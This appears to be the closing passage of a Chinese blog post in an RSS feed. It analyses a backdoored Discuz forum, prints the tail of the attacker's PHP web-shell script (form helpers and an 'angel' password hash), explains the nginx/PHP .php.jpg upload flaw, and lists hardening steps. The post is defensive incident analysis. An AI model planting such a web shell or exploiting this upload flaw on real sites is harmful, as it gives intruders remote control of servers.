<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;/select&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'newline'</span>]) <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/p&gt;'</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">formhead</span>($<span style="color: #ffcc66;">arg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>)) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">self</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'method'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'method'</span>] = <span style="color: #66cccc;">'post'</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'action'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'action'</span>] = $<span style="color: #ffcc66;">self</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'target'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'target'</span>] ? <span style="color: #66cccc;">"target=\"$arg[target]\""</span> : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'name'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'name'</span>] = <span style="color: #66cccc;">'form1'</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" metho</span><span style="color: #66cccc; text-decoration: underline;">d=\"$arg[method]\" $arg[target]&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;h2&gt;'</span>.$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>].<span style="color: #66cccc;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">maketext</span>($<span style="color: #ffcc66;">arg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>)){
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'cols'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'cols'</span>] = <span style="color: #cccccc; background-color: #2d2d2d;">100</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'rows'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'rows'</span>] = <span style="color: #cccccc; background-color: #2d2d2d;">25</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] ? $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>].<span style="color: #66cccc;">'&lt;br /&gt;'</span> : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;p&gt;$arg[title]&lt;textarea class=\"area\" id=\"$arg[name]\" name=\"$arg[name</span><span style="color: #66cccc; text-decoration: underline;">]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]&gt;$arg[value]&lt;/textarea&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">formfooter</span>($<span style="color: #ffcc66;">name</span> = <span style="color: #66cccc;">''</span>){
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">name</span> &amp;&amp; $<span style="color: #ffcc66;">name</span> = <span style="color: #66cccc;">'submit'</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;&lt;input class="bt" name="'</span>.$<span style="color: #ffcc66;">name</span>.<span style="color: #66cccc;">'" id="'</span>.$<span style="color: #ffcc66;">name</span>.<span style="color: #66cccc;">'" type="submit" value=</span><span style="color: #66cccc; text-decoration: underline;">"Submit"&gt;&lt;/p&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/form&gt;'</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">goback</span>(){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">self</span>, $<span style="color: #ffcc66;">nowpath</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;form action="'</span>.$<span style="color: #ffcc66;">self</span>.<span style="color: #66cccc;">'" method="post"&gt;&lt;input type="hidden" name="action"</span><span style="color: #66cccc; text-decoration: underline;"> value="file" /&gt;&lt;input type="hidden" name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'" /&gt;&lt;p&gt;&lt;input class="bt" type="submit" value="Go back..."&gt;&lt;/p&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">formfoot</span>(){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/form&gt;'</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">encode_pass</span>($<span style="color: #ffcc66;">pass</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pass</span> = <span style="color: #cccccc; background-color: #2d2d2d;">md5(</span><span style="color: #66cccc;">'angel'</span>.$<span style="color: #ffcc66;">pass</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pass</span> = <span style="color: #cccccc; background-color: #2d2d2d;">md5(</span>$<span style="color: #ffcc66;">pass</span>.<span style="color: #66cccc;">'angel'</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pass</span> = <span style="color: #cccccc; background-color: #2d2d2d;">md5(</span><span style="color: #66cccc;">'angel'</span>.$<span style="color: #ffcc66;">pass</span>.<span style="color: #66cccc;">'angel'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">pass</span>;
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">pr</span>($<span style="color: #ffcc66;">s</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> <span style="color: #66cccc;">"&lt;pre&gt;"</span>.<span style="color: #cccccc; background-color: #2d2d2d;">print_r(</span>$<span style="color: #ffcc66;">s</span>).<span style="color: #66cccc;">'&lt;/pre&gt;'</span>;
}

<span style="color: #cc99cc;">?&gt;</span>
</pre>
</div>

<p>
上面的脚本被恶意用户完成对系统的远程控制。
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">问题根源</h2>
<div class="outline-text-2" id="text-5">
<p>
这次发现的恶意代码注入应该是之前的一次 <code>nginx</code> 和 <code>php</code> <a href="http://www.oschina.net/translate/10-tips-for-securing-nginx#translate_28443">安全漏洞</a> 引起，当时由 <code>WooYun.org</code> 汇报，原来已经被恶意用户种下了这些后门。
</p>

<p>
这个漏洞简言之就是用户可以上传文件后缀为 <code>.php.jpg</code> 的文件，在外部访问时直接被当做 <code>php</code> 执行，罪魁祸首归结为以下三点：
</p>

<ul class="org-ul">
<li><code>php</code> 配置
</li>

<li><code>nginx</code> 配置
</li>

<li><code>discuz</code>

<p>
允许上传文件名指定后缀为 <code>.php.jpg</code>
</p>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-6" class="outline-2">
<h2 id="sec-6">加固措施</h2>
<div class="outline-text-2" id="text-6">
<ul class="org-ul">
<li>采用更严格的文件目录权限

<ul class="org-ul">
<li>列出属主不应该为 <code>nobody</code> 的目录：

<div class="org-src-container">

<pre class="src src-sh">find . -type d  | xargs ls -lad | grep nobody | grep -v <span style="color: #66cccc;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的目录（路径名包启/data）外，其它所有文件及目录属主都改为非 <code>nobody</code> 用户。
</p>

<p>
需要注意的是 <code>source/plugin/</code> 下的所有目录需要为所有用户添加上可执行权限（特别是自已开发并上传解压的插件），否则访问插件时会出现以下错误提示：
</p>

<pre class="example">
         指定的插件模块文件(XXXXXXXXXX)不存在或存在语法错误，请检查是否已将插件完整上传
</pre>
</li>

<li>列出属主不应该为 <code>nobody</code> 的文件：

<div class="org-src-container">

<pre class="src src-sh">find . -type f  | xargs ls -la | grep nobody | grep -v <span style="color: #66cccc;">'/data'</span>
</pre>
</div>

<p>
除 <code>discuz</code> 要求为可写的文件（路径名包启/data）外，其它所有文件属主都改为非 <code>nobody</code> 用户。
</p>
</li>

<li>列出 <code>nobody</code> 可写的文件

<div class="org-src-container">

<pre class="src src-sh">find . -type f ! -perm 0644  | xargs ls -la | grep -v <span style="color: #66cccc;">'/data/'</span>
</pre>
</div>

<p>
收回非必要的写权限。
</p>
</li>
</ul>
</li>

<li>确保上传目录中的 <code>php</code> 文件不会被当做 <code>php</code> 执行

<ul class="org-ul">
<li>data/attachment
</li>
<li>uc_server/data/avatar
</li>
<li>uc_server/data/tmp
</li>
</ul>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
    </channel>
</rss>